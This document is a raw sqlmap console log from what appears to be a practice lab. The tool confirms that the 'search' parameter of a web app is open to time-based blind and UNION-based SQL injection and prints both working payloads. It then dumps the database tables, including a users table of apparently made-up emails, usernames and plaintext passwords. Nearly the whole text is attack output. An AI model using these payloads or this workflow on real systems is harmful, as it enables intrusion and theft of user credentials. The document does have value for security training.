# Output
---
```shell
        ___
       __H__
 ___ ___[']_____ ___ ___  {1.9.2#stable}
|_ -| . ["]     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 18:26:30 /2025-07-04/

[18:26:30] [INFO] testing connection to the target URL
[18:26:30] [INFO] testing if the target URL content is stable
[18:26:31] [INFO] target URL content is stable
[18:26:31] [INFO] testing if GET parameter 'search' is dynamic
[18:26:31] [WARNING] GET parameter 'search' does not appear to be dynamic
[18:26:31] [WARNING] heuristic (basic) test shows that GET parameter 'search' might not be injectable
[18:26:31] [INFO] testing for SQL injection on GET parameter 'search'
[18:26:31] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[18:26:33] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[18:26:33] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[18:26:34] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[18:26:35] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
[18:26:35] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
[18:26:36] [INFO] testing 'Generic inline queries'
[18:26:36] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[18:26:37] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
[18:26:38] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
[18:26:38] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[18:26:49] [INFO] GET parameter 'search' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] Y
[18:26:49] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[18:26:49] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[18:26:49] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[18:26:50] [INFO] target URL appears to have 6 columns in query
[18:26:50] [INFO] GET parameter 'search' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
GET parameter 'search' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 59 HTTP(s) requests:
---
Parameter: search (GET)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: search=espada' AND (SELECT 9840 FROM (SELECT(SLEEP(5)))uBLs) AND 'bdac'='bdac

    Type: UNION query
    Title: Generic UNION query (NULL) - 6 columns
    Payload: search=espada' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,CONCAT(0x7162767671,0x4a717a655245776a444d4b62556757624e506a6b70417979454b426c6678576b7a45445255674562,0x717a6a7871)-- -
---
[18:26:50] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[18:26:51] [INFO] fetching database users password hashes
do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] N
do you want to perform a dictionary-based attack against retrieved password hashes? [Y/n/q] Y
[18:26:51] [WARNING] no clear password(s) found
database management system users password hashes:
[*] root [1]:
    password hash: NULL
[*] sql_injection [1]:
    password hash: NULL

[18:26:51] [WARNING] missing database parameter. sqlmap is going to use the current database to enumerate table(s) entries
[18:26:51] [INFO] fetching current database
[18:26:51] [INFO] fetching tables for database: 'sql_injection'
[18:26:52] [INFO] fetching columns for table 'users' in database 'sql_injection'
[18:26:52] [INFO] fetching entries for table 'users' in database 'sql_injection'
Database: sql_injection
Table: users
[15 entries]
+----+--------------------------------+-----------+--------------+--------------+-------------+
| id | email                          | name      | surname      | password     | username    |
+----+--------------------------------+-----------+--------------+--------------+-------------+
| 1  | ephraim_frits@supermail.com    | Angelo    | Williams     | ii7phaufuGah | angelo12    |
| 2  | JohnDMoore@dayrep.com          | John      | Moore        | Oir6ot6Aet4  | moore       |
| 3  | NicholeWWannamaker@teleworm.us | Nichole   | Wannamaker   | Baevaed0jah  | nicool      |
| 4  | LewisLSing@teleworm.us         | Lewis     | Sing         | aeShek9d     | singlewis   |
| 5  | RebeccaJRussell@rhyta.com      | Rebecca   | Russell      | uQuah5athah  | russrebecca |
| 6  | ArthurHNadeau@dayrep.com       | Arthur    | Nadeau       | to4ixia7C    | arthurnad   |
| 7  | temojev119@drlatvia.com        | teadorate | macheal      | temojev119   | teador      |
| 8  | MaryGChatterton@rhyta.com      | Mary      | G.Chatterton | Iequahx4     | Thiped      |
| 9  | CarrieDYoung@rhyta.com         | Carrie    | Young        | kei7Ru4aay   | Duccoldany  |
| 10 | KarenRVelez@rhyta.com          | Karen     | Velez        | aiPh1aht     | Basure      |
| 11 | VirginiaJBryson@jourrapide.com | Virginia  | Bryson       | Oom1dai2Ae   | Lonce1992   |
| 12 | TiffanyRGriffith@dayrep.com    | Tiffany   | Griffith     | ieSh6aim     | Lawas1965   |
| 13 | HeatherLJohnson@armyspy.com    | Heather   | Johnson      | Fah6einai7s  | Rompubse    |
| 14 | RamonaKWebster@dayrep.com      | Ramona    | Webster      | aeYahm6zee0  | Sequand     |
| 15 | andraJFraser@teleworm.us       | Sandra    | Fraser       | Oemeey3uji   | Moret1948   |
+----+--------------------------------+-----------+--------------+--------------+-------------+

[18:26:52] [INFO] table 'sql_injection.users' dumped to CSV file '/home/espada/.local/share/sqlmap/output/lzwdgttvhlknjbblqadq.tiagocardoso.xyz/dump/sql_injection/users.csv'
[18:26:52] [INFO] fetching columns for table 'stocks' in database 'sql_injection'
[18:26:53] [INFO] fetching entries for table 'stocks' in database 'sql_injection'
Database: sql_injection
Table: stocks
[5 entries]
+----+-------------+
| id | name        |
+----+-------------+
| 1  | iphone11    |
| 2  | applewatch7 |
| 3  | iphone13    |
| 4  | iphonese    |
| 5  | apple20w    |
+----+-------------+

[18:26:53] [INFO] table 'sql_injection.stocks' dumped to CSV file '/home/espada/.local/share/sqlmap/output/lzwdgttvhlknjbblqadq.tiagocardoso.xyz/dump/sql_injection/stocks.csv'
[18:26:53] [INFO] fetching columns for table 'images' in database 'sql_injection'
[18:26:53] [INFO] fetching entries for table 'images' in database 'sql_injection'
Database: sql_injection
Table: images
[10 entries]
+----+---------------+
| id | path          |
+----+---------------+
| 1  | images/1.png  |
| 2  | images/2.png  |
| 3  | images/3.png  |
| 4  | images/4.png  |
| 5  | images/5.png  |
| 6  | images/6.png  |
| 7  | images/7.png  |
| 8  | images/8.png  |
| 9  | images/9.png  |
| 10 | images/10.png |
+----+---------------+

[18:26:54] [INFO] table 'sql_injection.images' dumped to CSV file '/home/espada/.local/share/sqlmap/output/lzwdgttvhlknjbblqadq.tiagocardoso.xyz/dump/sql_injection/images.csv'
[18:26:54] [WARNING] HTTP error codes detected during run:
500 (Internal Server Error) - 36 times
[18:26:54] [INFO] fetched data logged to text files under '/home/espada/.local/share/sqlmap/output/lzwdgttvhlknjbblqadq.tiagocardoso.xyz'

[*] ending @ 18:26:54 /2025-07-04/



```


